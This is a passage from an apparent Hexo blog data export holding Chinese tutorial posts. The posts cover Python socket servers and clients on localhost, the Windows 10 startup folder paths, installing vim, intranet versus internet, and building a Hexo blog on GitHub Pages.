class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># bind_id留空的意思是本地IP 127.0.0.1</span></span><br><span class=\"line\">bind_id = <span class=\"string\">&quot;&quot;</span>  </span><br><span class=\"line\">bind_port = <span class=\"number\">9999</span></span><br><span class=\"line\"></span><br><span class=\"line\">server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">server.bind((bind_id, bind_port))</span><br><span class=\"line\">server.listen(<span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[*] Listening on &#123;&#125;:&#123;&#125;&#x27;</span> .<span class=\"built_in\">format</span>(bind_id, bind_port))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">handle_client</span>(<span class=\"params\">client_socket</span>):</span></span><br><span class=\"line\">    request = client_socket.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[*] Received: &#123;&#125;&#x27;</span> .<span class=\"built_in\">format</span>(request))</span><br><span class=\"line\">    send_it = <span class=\"string\">&quot;I love you&quot;</span></span><br><span class=\"line\">    client_socket.send(send_it.encode())</span><br><span class=\"line\">    client_socket.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">client, address = server.accept()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] Accepted connection from: &#123;&#125;:&#123;&#125;&quot;</span> .<span class=\"built_in\">format</span>(client, address))</span><br><span class=\"line\">client_handler_t1 = threading.Thread(target=handle_client, args=(client, ))</span><br><span class=\"line\">client_handler_t1.start()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"实战演练\"><a href=\"#实战演练\" class=\"headerlink\" title=\"实战演练\"></a>实战演练</h3><h4 id=\"服务器（采取多线程）\"><a href=\"#服务器（采取多线程）\" class=\"headerlink\" title=\"服务器（采取多线程）\"></a>服务器（采取多线程）</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"comment\"># from struct import pack</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadSocket</span>(<span class=\"params\"><span class=\"built_in\">object</span></span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, host, port</span>):</span></span><br><span class=\"line\">        self.host = host</span><br><span class=\"line\">        self.port = port</span><br><span class=\"line\">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class=\"number\">1</span>)</span><br><span class=\"line\">        self.sock.bind((self.host, self.port))</span><br><span class=\"line\">        <span class=\"comment\"># 超时收取，超过5秒没收到客户端回应自动断开连接</span></span><br><span class=\"line\">        <span class=\"comment\"># self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVTIMEO, pack(&#x27;QQ&#x27;, 5, 0))</span></span><br><span class=\"line\">        <span class=\"comment\"># 超时发送，超过5秒没将数据传送至客户端断开连接</span></span><br><span class=\"line\">        <span class=\"comment\"># self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO, pack(&#x27;QQ&#x27;, 4, 0))</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">listen</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        self.sock.listen(<span class=\"number\">5</span>)</span><br><span class=\"line\">        <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        在这里插入对Ctrl+C的控制</span></span><br><span class=\"line\"><span class=\"string\">        &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"comment\"># 循环连接，可以与多个客户端依次链接</span></span><br><span class=\"line\">        <span class=\"comment\"># while True:</span></span><br><span class=\"line\">        client, address = self.sock.accept()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;正在接收客户端信息...\\n&#x27;</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 超过30秒停止活动</span></span><br><span class=\"line\">        <span class=\"comment\"># client.settimeout(15)</span></span><br><span class=\"line\">        t1 = threading.Thread(target=self.handleClientRequest, args=(</span><br><span class=\"line\">            client, address))</span><br><span class=\"line\">        t1.start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">handleClientRequest</span>(<span class=\"params\">self, client, address</span>):</span></span><br><span class=\"line\">        <span class=\"comment\"># 采取循环，使每次与客户端连接都可以进行多次对话</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                data = client.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;显示客户端信息：&#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(data))</span><br><span class=\"line\">                <span class=\"keyword\">if</span> data:</span><br><span class=\"line\">                    client.send(data)</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Client has disconnected&quot;</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                client.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    server = ThreadSocket(<span class=\"string\">&#x27;&#x27;</span>, <span class=\"number\">9000</span>)</span><br><span class=\"line\">    server.listen()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"客户端\"><a href=\"#客户端\" class=\"headerlink\" title=\"客户端\"></a>客户端</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"></span><br><span class=\"line\">target_host = <span class=\"string\">&#x27;127.0.0.1&#x27;</span></span><br><span class=\"line\">target_ip = <span class=\"number\">9000</span></span><br><span class=\"line\"></span><br><span class=\"line\">client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">client.connect((target_host, target_ip))</span><br><span class=\"line\">send_data = <span class=\"built_in\">input</span>(<span class=\"string\">&#x27;输入你想说的：&#x27;</span>)</span><br><span class=\"line\">client.send(send_data.encode())</span><br><span class=\"line\">response = client.recv(<span class=\"number\">4096</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(response.decode() + <span class=\"string\">&#x27;love&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"三、socket常见选项之SO-REUSEADDR-SO-REUSEPORT\"><a href=\"#三、socket常见选项之SO-REUSEADDR-SO-REUSEPORT\" class=\"headerlink\" title=\"三、socket常见选项之SO_REUSEADDR,SO_REUSEPORT\"></a>三、<a href=\"https://www.cnblogs.com/HKUI/p/11707170.html\">socket常见选项之SO_REUSEADDR,SO_REUSEPORT</a></h3><ul>\n<li>使端口被释放后可以立即被使用</li>\n</ul>"},{"title":"win10开机自启文件夹","date":"2020-09-14T06:06:00.000Z","swiper":false,"swiperImg":"","img":"http://cdn.mxrblog.cn/ct_4.jpg","top":false,"_content":"\n## 所有用户的开机自启文件夹\n\n- 英文路径\n\n<!--more-->\n\n```\n# ProgramData目录是隐藏的\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\n```\n\n- 中文路径\n\n```\nC:\\ProgramData\\Microsoft\\Windows\\「开始」菜单\\程序\\启动\n```\n\n\n\n## 指定用户的开机自启文件夹\n\n- 英文路径\n\n```\nC:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n```\n\n- 中文路径\n\n```\nC:\\用户\\username\\AppData\\Roaming\\Microsoft\\Windows\\「开始」菜单\\程序\\启动\n```\n\n- 打开隐藏文件夹的方法\n\n[![BFDqhV.png](https://s1.ax1x.com/2020/10/22/BFDqhV.png)](https://imgchr.com/i/BFDqhV)\n\n","source":"_posts/win_10 开机自启文件夹.md","raw":"---\ntitle: win10开机自启文件夹\ndate: 2020-09-14 14:06\nswiper: false # 将改文章放入轮播图中\nswiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片\nimg: 'http://cdn.mxrblog.cn/ct_4.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片\ncategories: win10\ntags: [win10, 文件夹]   # 可以是数组\ntop: false\n---\n\n## 所有用户的开机自启文件夹\n\n- 英文路径\n\n<!--more-->\n\n```\n# ProgramData目录是隐藏的\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\n```\n\n- 中文路径\n\n```\nC:\\ProgramData\\Microsoft\\Windows\\「开始」菜单\\程序\\启动\n```\n\n\n\n## 指定用户的开机自启文件夹\n\n- 英文路径\n\n```\nC:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n```\n\n- 中文路径\n\n```\nC:\\用户\\username\\AppData\\Roaming\\Microsoft\\Windows\\「开始」菜单\\程序\\启动\n```\n\n- 打开隐藏文件夹的方法\n\n[![BFDqhV.png](https://s1.ax1x.com/2020/10/22/BFDqhV.png)](https://imgchr.com/i/BFDqhV)\n\n","slug":"win_10 开机自启文件夹","published":1,"updated":"2021-06-20T02:40:34.026Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq4nzaxx000k7vvthzhr0ai6","content":"<h2 id=\"所有用户的开机自启文件夹\"><a href=\"#所有用户的开机自启文件夹\" class=\"headerlink\" title=\"所有用户的开机自启文件夹\"></a>所有用户的开机自启文件夹</h2><ul>\n<li>英文路径</li>\n</ul>\n<span id=\"more\"></span>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ProgramData目录是隐藏的</span><br><span class=\"line\">C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>中文路径</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\ProgramData\\Microsoft\\Windows\\「开始」菜单\\程序\\启动</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"指定用户的开机自启文件夹\"><a href=\"#指定用户的开机自启文件夹\" class=\"headerlink\" title=\"指定用户的开机自启文件夹\"></a>指定用户的开机自启文件夹</h2><ul>\n<li>英文路径</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>中文路径</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\用户\\username\\AppData\\Roaming\\Microsoft\\Windows\\「开始」菜单\\程序\\启动</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>打开隐藏文件夹的方法</li>\n</ul>\n<p><a href=\"https://imgchr.com/i/BFDqhV\"><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/10/22/BFDqhV.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"BFDqhV.png\"></a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"所有用户的开机自启文件夹\"><a href=\"#所有用户的开机自启文件夹\" class=\"headerlink\" title=\"所有用户的开机自启文件夹\"></a>所有用户的开机自启文件夹</h2><ul>\n<li>英文路径</li>\n</ul>","more":"<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ProgramData目录是隐藏的</span><br><span class=\"line\">C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>中文路径</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\ProgramData\\Microsoft\\Windows\\「开始」菜单\\程序\\启动</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"指定用户的开机自启文件夹\"><a href=\"#指定用户的开机自启文件夹\" class=\"headerlink\" title=\"指定用户的开机自启文件夹\"></a>指定用户的开机自启文件夹</h2><ul>\n<li>英文路径</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>中文路径</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\用户\\username\\AppData\\Roaming\\Microsoft\\Windows\\「开始」菜单\\程序\\启动</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>打开隐藏文件夹的方法</li>\n</ul>\n<p><a href=\"https://imgchr.com/i/BFDqhV\"><img src=\"https://s1.ax1x.com/2020/10/22/BFDqhV.png\" alt=\"BFDqhV.png\"></a></p>"},{"title":"win10安装vim","date":"2020-09-14T06:06:00.000Z","swiper":false,"swiperImg":"","img":"http://cdn.mxrblog.cn/ct_6.jpg","top":false,"_content":"\n# windows10安装vim\n\n[点击链接]([Releases · vim/vim-win32-installer · GitHub](https://github.com/vim/vim-win32-installer/releases))\n\n- 注意：一些杀毒软件可能会阻止安装该软件，允许即可\n- 进入win10命令行，输入vim即可进入界面\n- 默认安装在C:\\Program Files\\Vim\n\n","source":"_posts/windows10安装vim.md","raw":"---\ntitle: win10安装vim\ndate: 2020-09-14 14:06\nswiper: false # 将改文章放入轮播图中\nswiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片\nimg: 'http://cdn.mxrblog.cn/ct_6.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片\ncategories: win10\ntags: [win10, vim]   # 可以是数组\ntop: false\n---\n\n# windows10安装vim\n\n[点击链接]([Releases · vim/vim-win32-installer · GitHub](https://github.com/vim/vim-win32-installer/releases))\n\n- 注意：一些杀毒软件可能会阻止安装该软件，允许即可\n- 进入win10命令行，输入vim即可进入界面\n- 默认安装在C:\\Program Files\\Vim\n\n","slug":"windows10安装vim","published":1,"updated":"2021-06-20T02:49:29.795Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq4nzaxy000p7vvt12nj50zh","content":"<h1 id=\"windows10安装vim\"><a href=\"#windows10安装vim\" class=\"headerlink\" title=\"windows10安装vim\"></a>windows10安装vim</h1><p>[点击链接](<a href=\"https://github.com/vim/vim-win32-installer/releases\">Releases · vim/vim-win32-installer · GitHub</a>)</p>\n<ul>\n<li>注意：一些杀毒软件可能会阻止安装该软件，允许即可</li>\n<li>进入win10命令行，输入vim即可进入界面</li>\n<li>默认安装在C:\\Program Files\\Vim</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"windows10安装vim\"><a href=\"#windows10安装vim\" class=\"headerlink\" title=\"windows10安装vim\"></a>windows10安装vim</h1><p>[点击链接](<a href=\"https://github.com/vim/vim-win32-installer/releases\">Releases · vim/vim-win32-installer · GitHub</a>)</p>\n<ul>\n<li>注意：一些杀毒软件可能会阻止安装该软件，允许即可</li>\n<li>进入win10命令行，输入vim即可进入界面</li>\n<li>默认安装在C:\\Program Files\\Vim</li>\n</ul>\n"},{"title":"内网与外网","date":"2020-09-14T06:06:00.000Z","swiper":false,"swiperImg":"","img":"http://cdn.mxrblog.cn/ct_7.jpg","top":false,"_content":"\n# 内网与外网\n\n[原文链接](https://zhuanlan.zhihu.com/p/147282153)\n\n## 一、名词概念\n\n### 内网\n\n<!--more-->\n\n- 即局域网是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。\n\n### 外网\n\n- 即广域网，又称公网。是连接不同地区局域网或城域网计算机通信的远程网。通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个地区、城市和国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。广域网并不等同于互联网。\n\n\n\n## 二、区别\n\n1. ip地址设置的区别，一般内网有自己的IP号段，也不会和互联网号段冲突，内网就是从路由器以下开始的，而且IP都是以192开头的IP。一般是不能拥有外网IP的，因为个人或者小群体用外网也是一种资源浪费，所以一般都是通过内网去上网的，外网Ip一般都是用于公司企业，学校等机构的。\n2. 内网电脑连接外网需要一个统一出口，可能被限制一些不必要的访问，而外网就不经路由器或交换机就可以上网的网络，可以直接被外界所访问到，无需经如何设备，直接连接电脑。\n3. 内网相对外网会多一层安全防火墙（外网路由），相对来说抵御来自外网的攻击能力会好一些；内网不足之处在于，可能会遭到来自内部的攻击；因为要共享带宽，相对网速可能会慢些（终端越多越慢）。\n4. 内网的ip可以经常换，可以自己定义规则；而外网的ip一般都是固定的，你装好宽带的时候，你的ip就固定下来了。\n","source":"_posts/内网与外网简介.md","raw":"---\ntitle: 内网与外网\ndate: 2020-09-14 14:06\nswiper: false # 将改文章放入轮播图中\nswiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片\nimg: 'http://cdn.mxrblog.cn/ct_7.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片\ncategories: 网络\ntags: [网络]   # 可以是数组\ntop: false\n---\n\n# 内网与外网\n\n[原文链接](https://zhuanlan.zhihu.com/p/147282153)\n\n## 一、名词概念\n\n### 内网\n\n<!--more-->\n\n- 即局域网是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。\n\n### 外网\n\n- 即广域网，又称公网。是连接不同地区局域网或城域网计算机通信的远程网。通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个地区、城市和国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。广域网并不等同于互联网。\n\n\n\n## 二、区别\n\n1. ip地址设置的区别，一般内网有自己的IP号段，也不会和互联网号段冲突，内网就是从路由器以下开始的，而且IP都是以192开头的IP。一般是不能拥有外网IP的，因为个人或者小群体用外网也是一种资源浪费，所以一般都是通过内网去上网的，外网Ip一般都是用于公司企业，学校等机构的。\n2. 内网电脑连接外网需要一个统一出口，可能被限制一些不必要的访问，而外网就不经路由器或交换机就可以上网的网络，可以直接被外界所访问到，无需经如何设备，直接连接电脑。\n3. 内网相对外网会多一层安全防火墙（外网路由），相对来说抵御来自外网的攻击能力会好一些；内网不足之处在于，可能会遭到来自内部的攻击；因为要共享带宽，相对网速可能会慢些（终端越多越慢）。\n4. 内网的ip可以经常换，可以自己定义规则；而外网的ip一般都是固定的，你装好宽带的时候，你的ip就固定下来了。\n","slug":"内网与外网简介","published":1,"updated":"2021-06-20T02:54:06.469Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq4nzay0000q7vvtfc5ha50e","content":"<h1 id=\"内网与外网\"><a href=\"#内网与外网\" class=\"headerlink\" title=\"内网与外网\"></a>内网与外网</h1><p><a href=\"https://zhuanlan.zhihu.com/p/147282153\">原文链接</a></p>\n<h2 id=\"一、名词概念\"><a href=\"#一、名词概念\" class=\"headerlink\" title=\"一、名词概念\"></a>一、名词概念</h2><h3 id=\"内网\"><a href=\"#内网\" class=\"headerlink\" title=\"内网\"></a>内网</h3><span id=\"more\"></span>\n\n<ul>\n<li>即局域网是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</li>\n</ul>\n<h3 id=\"外网\"><a href=\"#外网\" class=\"headerlink\" title=\"外网\"></a>外网</h3><ul>\n<li>即广域网，又称公网。是连接不同地区局域网或城域网计算机通信的远程网。通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个地区、城市和国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。广域网并不等同于互联网。</li>\n</ul>\n<h2 id=\"二、区别\"><a href=\"#二、区别\" class=\"headerlink\" title=\"二、区别\"></a>二、区别</h2><ol>\n<li>ip地址设置的区别，一般内网有自己的IP号段，也不会和互联网号段冲突，内网就是从路由器以下开始的，而且IP都是以192开头的IP。一般是不能拥有外网IP的，因为个人或者小群体用外网也是一种资源浪费，所以一般都是通过内网去上网的，外网Ip一般都是用于公司企业，学校等机构的。</li>\n<li>内网电脑连接外网需要一个统一出口，可能被限制一些不必要的访问，而外网就不经路由器或交换机就可以上网的网络，可以直接被外界所访问到，无需经如何设备，直接连接电脑。</li>\n<li>内网相对外网会多一层安全防火墙（外网路由），相对来说抵御来自外网的攻击能力会好一些；内网不足之处在于，可能会遭到来自内部的攻击；因为要共享带宽，相对网速可能会慢些（终端越多越慢）。</li>\n<li>内网的ip可以经常换，可以自己定义规则；而外网的ip一般都是固定的，你装好宽带的时候，你的ip就固定下来了。</li>\n</ol>\n","site":{"data":{}},"excerpt":"<h1 id=\"内网与外网\"><a href=\"#内网与外网\" class=\"headerlink\" title=\"内网与外网\"></a>内网与外网</h1><p><a href=\"https://zhuanlan.zhihu.com/p/147282153\">原文链接</a></p>\n<h2 id=\"一、名词概念\"><a href=\"#一、名词概念\" class=\"headerlink\" title=\"一、名词概念\"></a>一、名词概念</h2><h3 id=\"内网\"><a href=\"#内网\" class=\"headerlink\" title=\"内网\"></a>内网</h3>","more":"<ul>\n<li>即局域网是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</li>\n</ul>\n<h3 id=\"外网\"><a href=\"#外网\" class=\"headerlink\" title=\"外网\"></a>外网</h3><ul>\n<li>即广域网，又称公网。是连接不同地区局域网或城域网计算机通信的远程网。通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个地区、城市和国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。广域网并不等同于互联网。</li>\n</ul>\n<h2 id=\"二、区别\"><a href=\"#二、区别\" class=\"headerlink\" title=\"二、区别\"></a>二、区别</h2><ol>\n<li>ip地址设置的区别，一般内网有自己的IP号段，也不会和互联网号段冲突，内网就是从路由器以下开始的，而且IP都是以192开头的IP。一般是不能拥有外网IP的，因为个人或者小群体用外网也是一种资源浪费，所以一般都是通过内网去上网的，外网Ip一般都是用于公司企业，学校等机构的。</li>\n<li>内网电脑连接外网需要一个统一出口，可能被限制一些不必要的访问，而外网就不经路由器或交换机就可以上网的网络，可以直接被外界所访问到，无需经如何设备，直接连接电脑。</li>\n<li>内网相对外网会多一层安全防火墙（外网路由），相对来说抵御来自外网的攻击能力会好一些；内网不足之处在于，可能会遭到来自内部的攻击；因为要共享带宽，相对网速可能会慢些（终端越多越慢）。</li>\n<li>内网的ip可以经常换，可以自己定义规则；而外网的ip一般都是固定的，你装好宽带的时候，你的ip就固定下来了。</li>\n</ol>"},{"title":"搭建博客","date":"2020-09-14T06:06:00.000Z","swiper":false,"swiperImg":"","img":"http://cdn.mxrblog.cn/ct_9.jpg","top":false,"_content":"\n# 搭建静态页面个人博客\n\n[参考文献](https://www.jianshu.com/p/189fd945f38f)\n\n[参考文献]()\n\n### 安装hexo\n\n1. 检查电脑是否有node.js\n\n   ```\n   node -v\n   ```\n   <!--more-->\n\n2. 若没有则下载\n\n3. 安装npm\n\n   ```\n   npm install -g hexo-cli\n   这样会报错\n   ```\n\n   \n\n\n\n### 解决错误：\n\nMissing write access to /usr/local/lib/node_modules是没有写权限, npm官方给出的解决方案是新建一个有权限的文件夹, 在这个新文件夹中安装npm包. 这个方法不适用于Microsoft Windows系统.\n在用户的根目录创建文件夹(名字不一定要是.npm-global, 可以自己起):\n\n```\nmkdir ~/.npm-global\n```\n\n\n\n设置npm全局包的安装路径:\n\n```\nnpm config set prefix '~/.npm-global'\n```\n\n\n\n在用户的根目录下查看有没有.profile文件, 如果没有就创建, 然后用文本编辑器打开, 加上以下一行, 保存:\n\n```\nexport PATH=~/.npm-global/bin:$PATH\n```\n\n\n\n回到终端运行以下命令, 让配置生效:\n\n```\nsource /etc/profile\n```\n\n\n\n然后全局安装npm包就可以了.\n\n[原文链[接](https://blog.csdn.net/zhangxuekang/article/details/89075039)\n\n\n2. 将 Hexo 所在的目录下的 node_modules 添加到环境变量之中即可直接使用 hexo <command>：\n\n   echo 'PATH=\"$PATH:./node_modules/.bin\"' >> ~/.profile\n\n2. 初始化博客框架\n\n\n```\n# 选择一个地方新建博客目录\nnpx hexo init blog\n\n# 生成博客文件夹中的moudle文件夹\nnpx hexo g\n\n# 进行本机器运行测试\nnpx hexo server\n```\n\n\n\n### 主题切换\n\n1. 去hexo官网下载主题，克隆到自己的仓库下\n\n2. 配置自己的站点文件（根目录下的_config.yml,不是主题下的），切换至自己的主题\n\n   并且更改语言设置成zh-CN\n\n3. 在source文件夹下新建标签文件夹(tags)和分类文件夹(categories)以及about文件夹[内容为个人简介或声明],如果还需要其他的自己可以建，笔记文档放在_posts文件夹内\n\n### 博客与github挂钩\n\n1. 在github上新建一个仓库，仓库名为    自己的github名.github.io\n\n2. 在自己的博客目录下的站点配置文件_config.yml中进行配置，在文件的末尾找到并进行修改：\n\n   ```\n   deploy:\n   \ttype: git\n   \trepo: 仓库名称.git  (.git不能少)\n   \tbranch： master\n   ```\n\n3. 安装git部署插件\n\n   ```\n   npm install hexo-deployer-git --save\n   ```\n\n4. 之后\n\n   ```\n   npx hexo clean\n   npx hexo g\n   # 进行网站部署\n   npx hexo d\n   ```\n\n5. 大功告成\n\n## 绑定域名\n\n1. 先去购买域名\n\n2. 进行域名注册\n\n3. 再进行域名解析（必要的环节）\n\n   + 进入解析页面\n   + 添加解析\n   + 在命令行下ping自己的github和博客绑定的仓库\n   + 得到ip地址之后添加到解析列表\n\n4. 进入博客的source目录下，新建名为 CNAME 的文件，在里面写入自己申请的域名\n\n5. 进入blog，依次输入\n\n   \n\n   ```\n   npx hexo clean\n   npx hexo g\n   hexo d\n   ```\n\n6. 大功告成.\n\n\n\n### 